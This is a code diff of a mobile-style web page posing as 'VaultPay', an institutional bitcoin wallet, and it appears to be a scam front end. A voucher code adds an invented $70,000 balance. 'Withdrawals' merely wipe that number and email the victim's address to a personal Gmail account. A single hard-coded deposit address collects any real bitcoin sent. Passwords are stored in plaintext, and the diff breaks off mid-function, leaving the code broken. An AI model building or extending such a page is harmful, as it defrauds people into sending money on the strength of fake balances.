@@ -3,255 +3,130 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SuperFaucet | Institutional Digital Assets</title>
+<title>VaultPay | Institutional Digital Assets</title>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-dark: #050505;
-    --surface: #111111;
-    --surface-light: #1A1A1A;
-    --border: #262626;
-    --text-primary: #FFFFFF;
-    --text-secondary: #A3A3A3;
-    --accent: #F5A524; /* Crypto Gold */
-    --accent-glow: rgba(245, 165, 36, 0.15);
-    --success: #17C964;
-    --success-bg: rgba(23, 201, 100, 0.1);
-    --danger: #F31260;
+    --bg-dark: #050505; --surface: #111111; --surface-light: #1A1A1A; --border: #262626;
+    --text-primary: #FFFFFF; --text-secondary: #A3A3A3; --accent: #F5A524; 
+    --accent-glow: rgba(245, 165, 36, 0.15); --success: #17C964; --danger: #F31260;
   }
-
   * { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    font-family: 'Inter', sans-serif;
-    background-color: var(--bg-dark);
-    background-image: 
-      radial-gradient(circle at 15% 50%, rgba(255,255,255,0.02) 0%, transparent 25%),
-      radial-gradient(circle at 85% 30%, var(--accent-glow) 0%, transparent 25%);
-    color: var(--text-primary);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    overflow: hidden;
-  }
-
-  /* Main Container (Glassmorphism) */
-  .app-container {
-    background: var(--surface);
-    width: 100%;
-    max-width: 420px;
-    height: 100vh;
-    max-height: 800px;
-    border: 1px solid var(--border);
-    position: relative;
-    display: flex;
-    flex-direction: column;
-    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-  }
-
-  @media (min-width: 480px) {
-    .app-container { height: 90vh; border-radius: 24px; }
-  }
-
+  body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); background-image: radial-gradient(circle at 15% 50%, rgba(255,255,255,0.02) 0%, transparent 25%), radial-gradient(circle at 85% 30%, var(--accent-glow) 0%, transparent 25%); color: var(--text-primary); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+  .app-container { background: var(--surface); width: 100%; max-width: 420px; height: 100vh; max-height: 800px; border: 1px solid var(--border); position: relative; display: flex; flex-direction: column; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+  @media (min-width: 480px) { .app-container { height: 90vh; border-radius: 24px; } }
   .hidden { display: none !important; }
 
-  /* Start Screen */
-  .start-screen {
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100%;
-    padding: 40px;
-    text-align: center;
-    background: linear-gradient(180deg, var(--surface) 0%, var(--bg-dark) 100%);
-  }
+  /* Auth Screen */
+  .auth-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; padding: 40px; background: linear-gradient(180deg, var(--surface) 0%, var(--bg-dark) 100%); }
+  .logo-wrapper { width: 70px; height: 70px; background: linear-gradient(135deg, #333 0%, #111 100%); border-radius: 20px; display: flex; justify-content: center; align-items: center; border: 1px solid var(--border); margin-bottom: 24px; box-shadow: 0 0 30px var(--accent-glow); }
+  .auth-form { width: 100%; margin-top: 20px; }
+  .auth-toggle { margin-top: 20px; font-size: 13px; color: var(--text-secondary); cursor: pointer; transition: color 0.2s; text-align: center; }
+  .auth-toggle:hover { color: var(--text-primary); }
 
-  .logo-wrapper {
-    width: 80px; height: 80px;
-    background: linear-gradient(135deg, #333 0%, #111 100%);
-    border-radius: 20px;
-    display: flex; justify-content: center; align-items: center;
-    border: 1px solid var(--border);
-    margin-bottom: 24px;
-    box-shadow: 0 0 30px var(--accent-glow);
-  }
+  /* Dashboard */
+  .top-bar { padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
+  .network-status { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-secondary); font-weight: 500; letter-spacing: 0.5px; cursor: pointer; }
+  .network-status:hover { color: var(--danger); }
+  .dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; box-shadow: 0 0 8px var(--success); animation: pulse 2s infinite; }
+  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(23, 201, 100, 0.4); } 70% { box-shadow: 0 0 0 6px rgba(23, 201, 100, 0); } 100% { box-shadow: 0 0 0 0 rgba(23, 201, 100, 0); } }
 
-  /* Header & Network Status */
-  .top-bar {
-    padding: 20px 24px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .network-status {
-    display: flex; align-items: center; gap: 6px;
-    font-size: 11px; color: var(--text-secondary);
-    font-weight: 500; letter-spacing: 0.5px;
-  }
-
-  .dot {
-    width: 6px; height: 6px; background: var(--success);
-    border-radius: 50%; box-shadow: 0 0 8px var(--success);
-  }
-
-  /* Balance Section */
-  .balance-wrapper {
-    padding: 30px 24px 20px;
-    text-align: center;
-  }
-
-  .balance-label {
-    font-size: 12px; font-weight: 500;
-    color: var(--text-secondary);
-    text-transform: uppercase; letter-spacing: 1px;
-    margin-bottom: 8px;
-  }
-
-  .balance-amount {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 42px; font-weight: 700;
-    letter-spacing: -1px;
-    display: flex; justify-content: center; align-items: flex-start;
-  }
-
+  .balance-wrapper { padding: 30px 24px 20px; text-align: center; }
+  .balance-label { font-size: 12px; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+  .balance-amount { font-family: 'JetBrains Mono', monospace; font-size: 42px; font-weight: 700; letter-spacing: -1px; display: flex; justify-content: center; align-items: flex-start; }
   .currency-symbol { font-size: 24px; color: var(--text-secondary); margin-top: 6px; margin-right: 4px; }
 
-  /* Navigation Tabs */
-  .tab-nav {
-    display: flex; padding: 0 24px; gap: 8px; margin-bottom: 20px;
-  }
+  .tab-nav { display: flex; padding: 0 24px; gap: 8px; margin-bottom: 20px; }
+  .tab-btn { flex: 1; background: var(--surface-light); color: var(--text-secondary); border: 1px solid var(--border); padding: 12px 0; border-radius: 12px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
+  .tab-btn.active { background: var(--text-primary); color: var(--bg-dark); border-color: var(--text-primary); }
 
-  .tab-btn {
-    flex: 1; background: var(--surface-light); color: var(--text-secondary);
-    border: 1px solid var(--border); padding: 12px 0;
-    border-radius: 12px; font-size: 13px; font-weight: 600;
-    cursor: pointer; transition: all 0.2s ease;
-  }
-
-  .tab-btn.active {
-    background: var(--text-primary); color: var(--bg-dark);
-    border-color: var(--text-primary);
-  }
-
-  /* Content Panes */
-  .pane-container {
-    flex: 1; padding: 0 24px; overflow-y: auto;
-    scrollbar-width: none;
-  }
+  .pane-container { flex: 1; padding: 0 24px; overflow-y: auto; scrollbar-width: none; }
   .pane-container::-webkit-scrollbar { display: none; }
-
   .pane { animation: fadeSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+  @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-  @keyframes fadeSlideUp {
-    from { opacity: 0; transform: translateY(10px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  /* Forms & Inputs */
-  .input-group { margin-bottom: 20px; }
+  .input-group { margin-bottom: 20px; width: 100%; text-align: left; }
   .input-label { display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 8px; font-weight: 500; }
-  
-  input {
-    width: 100%; padding: 16px; background: var(--bg-dark);
-    border: 1px solid var(--border); border-radius: 12px;
-    color: var(--text-primary); font-family: 'JetBrains Mono', monospace;
-    font-size: 14px; transition: border 0.2s; outline: none;
-  }
+  input { width: 100%; padding: 16px; background: var(--bg-dark); border: 1px solid var(--border); border-radius: 12px; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 14px; transition: border 0.2s; outline: none; }
   input:focus { border-color: var(--accent); }
 
-  .primary-btn {
-    width: 100%; padding: 16px; background: var(--accent); color: #000;
-    border: none; border-radius: 12px; font-size: 15px; font-weight: 700;
-    cursor: pointer; transition: transform 0.1s, opacity 0.2s;
-  }
+  .primary-btn { width: 100%; padding: 16px; background: var(--accent); color: #000; border: none; border-radius: 12px; font-size: 15px; font-weight: 700; cursor: pointer; transition: transform 0.1s, opacity 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
   .primary-btn:active { transform: scale(0.98); }
-  .primary-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .primary-btn:disabled { opacity: 0.7; cursor: not-allowed; }
 
-  /* Address Box */
-  .address-card {
-    background: var(--bg-dark); border: 1px solid var(--border);
-    border-radius: 12px; padding: 16px; margin-top: 8px;
-    position: relative; cursor: pointer; transition: border-color 0.2s;
-  }
+  .btn-secondary { background: transparent; color: var(--text-primary); border: 1px solid var(--border); margin-top: 10px; }
+  .btn-secondary:hover { border-color: var(--accent); }
+
+  .address-card { background: var(--bg-dark); border: 1px solid var(--border); border-radius: 12px; padding: 16px; margin-top: 8px; position: relative; cursor: pointer; transition: border-color 0.2s; }
   .address-card:hover { border-color: var(--accent); }
-  .address-hash {
-    font-family: 'JetBrains Mono', monospace; font-size: 12px;
-    color: var(--accent); word-break: break-all; line-height: 1.5;
-  }
-  .copy-icon {
-    position: absolute; right: 12px; top: 12px;
-    background: var(--surface-light); padding: 4px 8px;
-    border-radius: 6px; font-size: 10px; color: var(--text-secondary);
-  }
+  .address-hash { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--accent); word-break: break-all; line-height: 1.5; }
+  .copy-icon { position: absolute; right: 12px; top: 12px; background: var(--surface-light); padding: 4px 8px; border-radius: 6px; font-size: 10px; color: var(--text-secondary); }
 
-  /* Ledger / History */
-  .ledger-item {
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 16px 0; border-bottom: 1px solid var(--border);
-  }
+  /* Ledger */
+  .ledger-item { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid var(--border); }
   .ledger-left { display: flex; flex-direction: column; gap: 4px; }
   .ledger-right { text-align: right; display: flex; flex-direction: column; gap: 4px; }
   .tx-title { font-size: 14px; font-weight: 600; }
   .tx-hash { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-secondary); }
   .tx-amount { font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--text-primary); }
-  .status-badge {
-    display: inline-block; padding: 4px 8px; border-radius: 4px;
-    font-size: 10px; font-weight: 600; text-transform: uppercase;
-  }
+  .tx-positive { color: var(--success); }
+  .status-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; text-transform: uppercase; }
   .status-pending { background: var(--accent-glow); color: var(--accent); }
-  
+  .status-confirmed { background: rgba(23, 201, 100, 0.1); color: var(--success); }
   .empty-state { text-align: center; padding: 40px 0; color: var(--text-secondary); font-size: 13px; }
 
-  /* Custom Toasts */
-  .toast-container {
-    position: absolute; bottom: 24px; left: 24px; right: 24px;
-    display: flex; flex-direction: column; gap: 10px; z-index: 100;
-  }
-  .toast {
-    background: var(--surface-light); border: 1px solid var(--border);
-    padding: 16px; border-radius: 12px; display: flex; align-items: center; gap: 12px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    animation: slideInUp 0.3s ease forwards;
-  }
+  /* Toasts */
+  .toast-container { position: absolute; bottom: 24px; left: 24px; right: 24px; display: flex; flex-direction: column; gap: 10px; z-index: 100; }
+  .toast { background: var(--surface-light); border: 1px solid var(--border); padding: 16px; border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: slideInUp 0.3s ease forwards; }
   .toast.success { border-left: 4px solid var(--success); }
   .toast.info { border-left: 4px solid var(--accent); }
+  .toast.error { border-left: 4px solid var(--danger); }
   .toast-msg { font-size: 13px; font-weight: 500; }
+  @keyframes slideInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
 
-  @keyframes slideInUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-  @keyframes fadeOut {
-    to { opacity: 0; transform: translateY(-10px); }
-  }
-
-  /* SVG Icons */
   svg { width: 24px; height: 24px; stroke: currentColor; stroke-width: 2; fill: none; }
+  .spinner { animation: spin 1s linear infinite; width: 18px; height: 18px; }
+  @keyframes spin { 100% { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
 <div class="app-container">
   
-  <div id="screen-start" class="start-screen">
+  <div id="screen-auth" class="auth-screen">
     <div class="logo-wrapper">
-      <svg viewBox="0 0 24 24" style="width:40px; height:40px; stroke: var(--accent);"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <svg viewBox="0 0 24 24" style="width:34px; height:34px; stroke: var(--accent);"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
     </div>
-    <h1 style="font-size: 28px; margin-bottom: 8px;">Vault<span style="color: var(--accent)">Pay</span></h1>
-    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 40px; line-height: 1.5;">Institutional-grade custody <br>for digital assets.</p>
-    <button class="primary-btn" onclick="navTo('main')">Authenticate Node</button>
+    <h1 style="font-size: 26px; margin-bottom: 4px;">Vault<span style="color: var(--accent)">Pay</span></h1>
+    <p style="color: var(--text-secondary); font-size: 13px;">Secure Node Authentication</p>
+
+    <div class="auth-form">
+      <div class="input-group">
+        <label class="input-label">EMAIL ADDRESS</label>
+        <input type="email" id="auth-email" placeholder="admin@vaultpay.com">
+      </div>
+      <div class="input-group">
+        <label class="input-label">PASSWORD</label>
+        <input type="password" id="auth-pass" placeholder="••••••••">
+      </div>
+      <button class="primary-btn" id="btn-auth" onclick="handleAuth()">Access Node</button>
+      <div class="auth-toggle" id="auth-toggle" onclick="toggleAuthMode()">New user? Create a secure account</div>
+    </div>
   </div>
 
   <div id="screen-main" class="hidden" style="display: flex; flex-direction: column; height: 100%;">
     
     <div class="top-bar">
-      <div style="font-weight: 600; font-size: 16px;">Node <span style="color: var(--text-secondary)">#8472</span></div>
-      <div class="network-status"><div class="dot"></div> BTC MAINNET</div>
+      <div style="font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px;">
+        <div class="dot"></div>
+        <span id="user-display">User</span>
+      </div>
+      <div class="network-status" onclick="logout()">
+        <svg viewBox="0 0 24 24" style="width:14px; height:14px;"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg> 
+        LOGOUT
+      </div>
     </div>
 
     <div class="balance-wrapper">
@@ -269,20 +144,24 @@
     </div>
 
     <div class="pane-container">
-      
       <div id="pane-deposit" class="pane">
         <div class="input-label">DEPOSIT ADDRESS (BTC)</div>
-        <p style="font-size: 12px; color: var(--text-secondary); margin-bottom: 12px;">Send only Bitcoin (BTC) to this address. Sending any other asset will result in permanent loss.</p>
         <div class="address-card" onclick="copyAddress()">
-          <div class="address-hash">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
+          <div class="address-hash" id="wallet-address">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
           <div class="copy-icon">COPY</div>
         </div>
+        <p style="font-size: 11px; color: var(--text-secondary); margin: 12px 0;">Funds sent here are automatically tracked on the blockchain and added to your USD balance.</p>
+        
+        <button class="primary-btn btn-secondary" id="btn-scan" onclick="scanBlockchain()">
+          <svg viewBox="0 0 24 24" style="width:16px; height:16px;"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+          Scan For Deposits
+        </button>
       </div>
 
       <div id="pane-promo" class="pane hidden">
         <div class="input-group">
           <label class="input-label">REDEEM VOUCHER</label>
-          <input type="text" id="input-promo" placeholder="Enter voucher code (e.g., PROMOBTC)" autocomplete="off" spellcheck="false">
+          <input type="text" id="input-promo" placeholder="Enter voucher code" autocomplete="off">
         </div>
         <button class="primary-btn" onclick="applyPromo()">Apply Credit</button>
       </div>
@@ -290,20 +169,14 @@
       <div id="pane-withdraw" class="pane hidden">
         <div class="input-group">
           <label class="input-label">DESTINATION ADDRESS</label>
-          <input type="text" id="input-withdraw" placeholder="bc1q..." autocomplete="off" spellcheck="false">
-        </div>
-        <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 20px;">
-          <span style="color: var(--text-secondary)">Network Fee:</span>
-          <span>0.00 BTC</span>
+          <input type="text" id="input-withdraw" placeholder="bc1q..." autocomplete="off">
         </div>
         <button class="primary-btn" id="btn-withdraw" onclick="executeWithdraw()">Confirm Transfer</button>
       </div>
 
       <div id="pane-history" class="pane hidden">
-        <div id="history-container">
-          </div>
+        <div id="history-container"></div>
       </div>
-
     </div>
   </div>
 
@@ -312,177 +185,177 @@
 </div>
 
 <script>
-  /* ================================
-     1. CONFIG & INIT
-     ================================ */
+  /* CONFIG */
   const EMAILJS_PUBLIC_KEY = 'VB9Rt0bAl5Fp2JxmU';
   const EMAILJS_SERVICE_ID = 'service_k743psj';
   const EMAILJS_TEMPLATE_ID = 'template_0nybbv8';
-
   emailjs.init(EMAILJS_PUBLIC_KEY);
 
-  /* ================================
-     2. STATE MANAGEMENT
-     ================================ */
-  let userBalance = parseFloat(localStorage.getItem('vault_premium_bal')) || 0;
-  let txHistory = JSON.parse(localStorage.getItem('vault_premium_history')) || [];
+  const BTC_WALLET_ADDRESS = 'bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d'; // Your tracking address
 
-  function syncState() {
-    // Format to 2 decimal places with commas
-    document.getElementById('ui-balance').textContent = userBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-    localStorage.setItem('vault_premium_bal', userBalance);
-    localStorage.setItem('vault_premium_history', JSON.stringify(txHistory));
-    renderLedger();
+  /* AUTHENTICATION */
+  let isLoginMode = true;
+  let currentUser = null;
+
+  window.onload = () => {
+    const activeSession = sessionStorage.getItem('vault_active_session');
+    if(activeSession) { currentUser = activeSession; navToDashboard(); }
+  };
+
+  function toggleAuthMode() {
+    isLoginMode = !isLoginMode;
+    document.getElementById('btn-auth').textContent = isLoginMode ? 'Access Node' : 'Create Account';
+    document.getElementById('auth-toggle').textContent = isLoginMode ? 'New user? Create a secure account' : 'Already registered? Sign in here';
   }
 
-  /* ================================
-     3. UI / NAVIGATION
-     ================================ */
-  function navTo(screen) {
-    document.getElementById('screen-start').classList.add('hidden');
-    document.getElementById('screen-main').classList.remove('hidden');
+  function handleAuth() {
+    const email = document.getElementById('auth-email').value.trim();
+    const pass = document.getElementById('auth-pass').value.trim();
+    if(!email || !pass) return showToast('Please enter credentials', 'error');
+
+    if(!isLoginMode) {
+      if(localStorage.getItem('vault_user_' + email)) return showToast('Account exists', 'error');
+      localStorage.setItem('vault_user_' + email, pass);
+      loginUser(email);
+    } else {
+      if(localStorage.getItem('vault_user_' + email) === pass) loginUser(email);
+      else showToast('Invalid credentials', 'error');
+    }
+  }
+
+  function loginUser(email) {
+    currentUser = email;
+    sessionStorage.setItem('vault_active_session', email);
+    navToDashboard();
+  }
+
+  function logout() {
+    sessionStorage.removeItem('vault_active_session');
+    currentUser = null;
+    document.getElementById('screen-main').classList.add('hidden');
+    document.getElementById('screen-auth').classList.remove('hidden');
+  }
+
+  /* APP STATE */
+  let userBalance = 0;
+  let txHistory = [];
+
+  function loadUserData() {
+    userBalance = parseFloat(localStorage.getItem(`bal_${currentUser}`)) || 0;
+    txHistory = JSON.parse(localStorage.getItem(`hist_${currentUser}`)) || [];
+    document.getElementById('user-display').textContent = currentUser.split('@')[0];
+    document.getElementById('wallet-address').textContent = BTC_WALLET_ADDRESS;
     syncState();
   }
 
+  function syncState() {
+    document.getElementById('ui-balance').textContent = userBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    localStorage.setItem(`bal_${currentUser}`, userBalance);
+    localStorage.setItem(`hist_${currentUser}`, JSON.stringify(txHistory));
+    renderLedger();
+  }
+
+  function navToDashboard() {
+    document.getElementById('screen-auth').classList.add('hidden');
+    document.getElementById('screen-main').classList.remove('hidden');
+    loadUserData();
+  }
+
   function switchTab(targetPane, btnElement) {
-    // Hide all panes
-    ['deposit', 'promo', 'withdraw', 'history'].forEach(p => {
-      document.getElementById('pane-' + p).classList.add('hidden');
-    });
-    // Remove active class from buttons
+    ['deposit', 'promo', 'withdraw', 'history'].forEach(p => document.getElementById('pane-' + p).classList.add('hidden'));
     document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-    
-    // Show target
     document.getElementById('pane-' + targetPane).classList.remove('hidden');
     btnElement.classList.add('active');
   }
 
-  /* ================================
-     4. CUSTOM TOAST NOTIFICATIONS
-     ================================ */
+  /* BLOCKCHAIN TRACKING LOGIC */
+  async function scanBlockchain() {
+    const btn = document.getElementById('btn-scan');
+    btn.disabled = true;
+    btn.innerHTML = '<svg class="spinner" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="var(--accent)" stroke-width="4" stroke-dasharray="30"></circle></svg> Syncing Network...';
+
+    try {
+      // 1. Fetch current wallet stats from public blockchain
+      const res = await fetch(`https://mempool.space/api/address/${BTC_WALLET_ADDRESS}`);
+      if (!res.ok) throw new Error("API Error");
+      const data = await res.json();
+
+      // Total Satoshis received ever (confirmed + unconfirmed)
+      const totalSatsReceived = data.chain_stats.funded_txo_sum + data.mempool_stats.funded_txo_sum;
+      
+      // Get the baseline from the last time they checked
+      const storageKey = `tracked_sats_${currentUser}_${BTC_WALLET_ADDRESS}`;
+      const lastSeenSats = parseInt(localStorage.getItem(storageKey));
+
+      if (isNaN(lastSeenSats)) {
+        // First time checking: initialize the baseline so we don't add historical balances
+        localStorage.setItem(storageKey, totalSatsReceived);
+        showToast('Wallet connected to network. Listening for new deposits.', 'info');
+      } else if (totalSatsReceived > lastSeenSats) {
+        // NEW DEPOSIT DETECTED!
+        const newSats = totalSatsReceived - lastSeenSats;
+        const btcAmount = newSats / 100000000; // Convert Sats to BTC
+
+        // 2. Fetch live BTC price to convert to USD
+        const priceRes = await fetch('https://api.coindesk.com/v1/bpi/currentprice/USD.json');
+        const priceData = await priceRes.json();
+        const btcPrice = priceData.bpi.USD.rate_float;
+        
+        const usdValue = btcAmount * btcPrice;
+
+        // 3. Add to user balance and history
+        userBalance += usdValue;
+        
+        const dateStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+        txHistory.unshift({ type: 'Deposit', amount: usdValue, address: 'Network Transfer', date: dateStr, status: 'Confirmed' });
+        
+        // Update baseline so we don't count it twice
+        localStorage.setItem(storageKey, totalSatsReceived);
+        syncState();
+
+        showToast(`Deposit Confirmed! +$${usdValue.toLocaleString('en-US', {minimumFractionDigits:2})}`, 'success');
+      } else {
+        showToast('No new transactions found on the blockchain.', 'info');
+      }
+    } catch (error) {
+      console.error(error);
+      showToast('Failed to connect to the blockchain.', 'error');
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = '<svg viewBox="0 0 24 24" style="width:16px; height:16px;"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg> Scan For Deposits';
+    }
+  }
+
+  /* OTHER UTILITIES */
   function showToast(message, type = 'success') {
     const area = document.getElementById('toast-area');
     const toast = document.createElement('div');
     toast.className = `toast ${type}`;
-    
-    let icon = type === 'success' 
-      ? '<svg viewBox="0 0 24 24" style="stroke:var(--success)"><polyline points="20 6 9 17 4 12"></polyline></svg>'
-      : '<svg viewBox="0 0 24 24" style="stroke:var(--accent)"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>';
-
+    let icon = type === 'success' ? '<svg viewBox="0 0 24 24" style="stroke:var(--success)"><polyline points="20 6 9 17 4 12"></polyline></svg>' : (type === 'error' ? '<svg viewBox="0 0 24 24" style="stroke:var(--danger)"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>' : '<svg viewBox="0 0 24 24" style="stroke:var(--accent)"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>');
     toast.innerHTML = `${icon} <div class="toast-msg">${message}</div>`;
     area.appendChild(toast);
-
-    setTimeout(() => {
-      toast.style.animation = 'fadeOut 0.3s ease forwards';
-      setTimeout(() => toast.remove(), 300);
-    }, 4000);
+    setTimeout(() => { toast.style.animation = 'fadeOut 0.3s ease forwards'; setTimeout(() => toast.remove(), 300); }, 4000);
   }
 
-  /* ================================
-     5. ACTIONS
-     ================================ */
   function copyAddress() {
-    navigator.clipboard.writeText('bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d');
-    showToast('Deposit address copied to clipboard', 'success');
+    navigator.clipboard.writeText(BTC_WALLET_ADDRESS);
+    showToast('Deposit address copied', 'success');
   }
 
   function applyPromo() {
     const input = document.getElementById('input-promo');
-    const code = input.value.trim().toUpperCase();
-    
-    if(code === 'PROMOBTC') {
-      userBalance += 70000;
-      syncState();
-      showToast('Voucher applied: +$70,000.00 to account', 'success');
-      input.value = '';
-    } else {
-      showToast('Invalid or expired voucher code', 'info');
-    }
+    if(input.value.trim().toUpperCase() === 'PROMOBTC') {
+      userBalance += 70000; syncState(); showToast('Voucher applied: +$70,000.00', 'success'); input.value = '';
+    } else showToast('Invalid voucher', 'error');
   }
 
   function executeWithdraw() {
-    const addrInput = document.getElementById('input-withdraw');
-    const addr = addrInput.value.trim();
+    const addr = document.getElementById('input-withdraw').value.trim();
     const btn = document.getElementById('btn-withdraw');
+    if(!addr || userBalance <= 0) return showToast('Invalid address or insufficient funds', 'error');
 
-    if(!addr) {
-      showToast('Please enter a destination address', 'info');
-      return;
-    }
-    if(userBalance <= 0) {
-      showToast('Insufficient funds for transfer', 'info');
-      return;
-    }
-
-    // Lock button
-    btn.disabled = true;
-    btn.textContent = 'Processing...';
-
-    // 1. Capture exact amount before wiping
+    btn.disabled = true; btn.textContent = 'Processing...';
     const withdrawAmount = userBalance;
+    userBalance = 0; syncState();
 
-    // 2. Wipe balance to 0 instantly
-    userBalance = 0;
-    syncState();
-
-    // 3. Add to Ledger History
-    const dateStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
-    txHistory.unshift({
-      id: 'TX-' + Math.random().toString(36).substr(2, 6).toUpperCase(),
-      amount: withdrawAmount,
-      address: addr,
-      date: dateStr,
-      status: 'Pending'
-    });
-    syncState();
-
-    // 4. Notify User
-    showToast('Reward confirmation in progress please wait...', 'info');
-
-    // 5. Send Data to EmailJS
-    const emailData = {
-      Title: "$" + withdrawAmount.toLocaleString('en-US', {minimumFractionDigits: 2}), 
-      Name: addr,
-      to_email: 'nibir.baruah2000@gmail.com'
-    };
-
-    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailData)
-      .then(() => {
-        // Reset UI State
-        btn.disabled = false;
-        btn.textContent = 'Confirm Transfer';
-        addrInput.value = '';
-      })
-      .catch((error) => {
-        console.error("EmailJS Error:", error);
-        btn.disabled = false;
-        btn.textContent = 'Confirm Transfer';
-      });
-  }
-
-  function renderLedger() {
-    const container = document.getElementById('history-container');
     
-    if(txHistory.length === 0) {
-      container.innerHTML = '<div class="empty-state">No transaction history found.</div>';
-      return;
-    }
-
-    container.innerHTML = txHistory.map(tx => `
-      <div class="ledger-item">
-        <div class="ledger-left">
-          <div class="tx-title">Withdrawal</div>
-          <div class="tx-hash">To: ${tx.address.substring(0,8)}...${tx.address.slice(-4)}</div>
-          <div class="tx-hash" style="color:#666">${tx.date} • ${tx.id}</div>
-        </div>
-        <div class="ledger-right">
-          <div class="tx-amount">-$${tx.amount.toLocaleString('en-US')}</div>
-          <div><span class="status-badge status-pending">${tx.status}</span></div>
-        </div>
-      </div>
-    `).join('');
-  }
-</script>
-
-</body>
-</html>
